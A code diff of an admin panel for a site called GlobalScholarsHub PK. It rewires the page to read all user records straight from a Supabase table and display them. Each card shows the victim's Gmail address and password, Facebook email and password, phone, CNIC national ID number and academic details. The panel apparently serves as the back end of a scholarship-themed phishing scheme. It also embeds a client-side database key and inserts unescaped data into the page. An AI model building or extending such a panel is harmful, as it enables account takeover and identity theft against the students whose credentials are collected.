@@ -2,7 +2,8 @@
 <html>
 <head>
     <title>Admin Panel - GlobalScholarsHub PK</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; padding: 20px; }
@@ -27,20 +28,13 @@
         .tag-gmail { background: #fce8e6; color: #ea4335; }
         .tag-fb { background: #e8f0fe; color: #1877f2; }
         .tag-profile { background: #d1fae5; color: #059669; }
-        .tag-doc { background: #fef3c7; color: #d97706; }
         .user-card .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px 30px; }
         .user-card .data-grid .field { font-size: 14px; padding: 4px 0; border-bottom: 1px solid #f8fafc; }
         .user-card .data-grid .field strong { color: #0a1628; font-weight: 600; }
         .user-card .data-grid .field .value { color: #475569; }
-        .user-card .section-title { font-weight: 600; color: #0a1628; margin-top: 12px; margin-bottom: 6px; font-size: 14px; }
-        .user-card .section-title i { color: #2563eb; margin-right: 6px; }
-        .user-card .image-preview { width: 80px; height: 80px; border-radius: 12px; object-fit: cover; border: 2px solid #eef2f6; margin-top: 6px; cursor: pointer; }
-        .user-card .doc-list { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 6px; }
-        .user-card .doc-list .doc-tag { background: #f0f4f8; padding: 4px 14px; border-radius: 50px; font-size: 12px; color: #0a1628; }
-        .user-card .doc-list .doc-tag i { color: #2563eb; margin-right: 4px; }
         .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
         .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
-        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } .header { flex-direction: column; text-align: center; } }
+        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
 <body>
@@ -61,74 +55,75 @@
     </div>
     
     <script>
+        // ===== DIRECT SUPABASE CONNECTION =====
+        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
+        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
         async function loadUsers() {
             try {
-                const response = await fetch('/api/users');
-                const users = await response.json();
-                
+                const { data: users, error } = await supabase
+                    .from('users')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+
+                if (error) {
+                    console.error('❌ Supabase Error:', error);
+                    return;
+                }
+
+                console.log('📊 Users:', users);
+
+                // ===== Stats Update =====
                 document.getElementById('totalUsers').textContent = users.length;
                 document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
-                document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
-                document.getElementById('profileUsers').textContent = users.filter(u => u.profileCompleted).length;
-                
+                document.getElementById('fbUsers').textContent = users.filter(u => u.fb_email).length;
+                document.getElementById('profileUsers').textContent = users.filter(u => u.profile_completed).length;
+
                 const container = document.getElementById('usersList');
-                
+
                 if (users.length === 0) {
                     container.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i><br />No users registered yet.</div>';
                     return;
                 }
-                
+
                 let html = '<div class="total-text"><i class="fas fa-list"></i>Total ' + users.length + ' users registered</div>';
-                
+
                 users.slice().reverse().forEach((user, index) => {
                     const userNum = users.length - index;
                     html += '<div class="user-card">';
-                    html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span><span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || 'N/A') + '</span></div>';
+                    html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
+                    html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submitted_at || user.created_at || 'N/A') + '</span></div>';
+                    
                     html += '<div class="badges">';
                     if (user.email) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
-                    if (user.fbEmail) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
-                    if (user.profileCompleted) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
-                    if (user.documents && user.documents.length > 0) html += '<span class="tag tag-doc"><i class="fas fa-file"></i> ' + user.documents.length + ' Docs</span>';
+                    if (user.fb_email) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
+                    if (user.profile_completed) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
                     html += '</div>';
+                    
                     html += '<div class="data-grid">';
                     if (user.name) html += '<div class="field"><strong>👤 Name:</strong> <span class="value">' + user.name + '</span></div>';
-                    if (user.firstName) html += '<div class="field"><strong>👤 First Name:</strong> <span class="value">' + user.firstName + '</span></div>';
-                    if (user.lastName) html += '<div class="field"><strong>👤 Last Name:</strong> <span class="value">' + user.lastName + '</span></div>';
                     if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
                     if (user.password) html += '<div class="field"><strong>🔑 Password:</strong> <span class="value">' + user.password + '</span></div>';
-                    if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
-                    if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
+                    if (user.fb_email) html += '<div class="field"><strong>📘 Facebook:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fb_email + '</span></div>';
+                    if (user.fb_password) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fb_password + '</span></div>';
                     if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                     if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
-                    if (user.nationality) html += '<div class="field"><strong>🇵🇰 Nationality:</strong> <span class="value">' + user.nationality + '</span></div>';
-                    if (user.country) html += '<div class="field"><strong>🏠 Country:</strong> <span class="value">' + user.country + '</span></div>';
-                    if (user.dob) html += '<div class="field"><strong>📅 DOB:</strong> <span class="value">' + user.dob + '</span></div>';
-                    if (user.gender) html += '<div class="field"><strong>⚥ Gender:</strong> <span class="value">' + user.gender + '</span></div>';
-                    if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
-                    if (user.educationLevel) html += '<div class="field"><strong>📚 Education:</strong> <span class="value">' + user.educationLevel + '</span></div>';
-                    if (user.fieldOfStudy) html += '<div class="field"><strong>📖 Field:</strong> <span class="value">' + user.fieldOfStudy + '</span></div>';
                     if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
                     if (user.gpa) html += '<div class="field"><strong>📊 GPA:</strong> <span class="value">' + user.gpa + '</span></div>';
-                    if (user.address) html += '<div class="field"><strong>🏠 Address:</strong> <span class="value">' + user.address + '</span></div>';
-                    if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
+                    if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
                     html += '</div>';
-                    if (user.about) html += '<div class="section-title"><i class="fas fa-quote-left"></i>About</div><div style="background:#f8fafc;padding:10px 14px;border-radius:8px;color:#475569;font-size:14px;margin-top:6px;border-left:3px solid #2563eb;">' + user.about + '</div>';
-                    if (user.documents && user.documents.length > 0) {
-                        html += '<div class="section-title"><i class="fas fa-file-upload"></i>Documents</div><div class="doc-list">';
-                        user.documents.forEach(doc => {
-                            html += '<span class="doc-tag"><i class="fas fa-file"></i> ' + (doc.name || doc) + '</span>';
-                        });
-                        html += '</div>';
-                    }
-                    if (user.profileImage) html += '<div class="section-title"><i class="fas fa-image"></i>Profile Image</div><img src="' + user.profileImage + '" class="image-preview" onclick="window.open(this.src)" />';
                     html += '</div>';
                 });
-                
+
                 container.innerHTML = html;
             } catch (error) {
-                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data. Make sure server is running.</div>';
+                console.error('❌ Error loading users:', error);
+                document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data</div>';
             }
         }
+
+        // ===== Load on page load =====
         loadUsers();
     </script>
 </body>
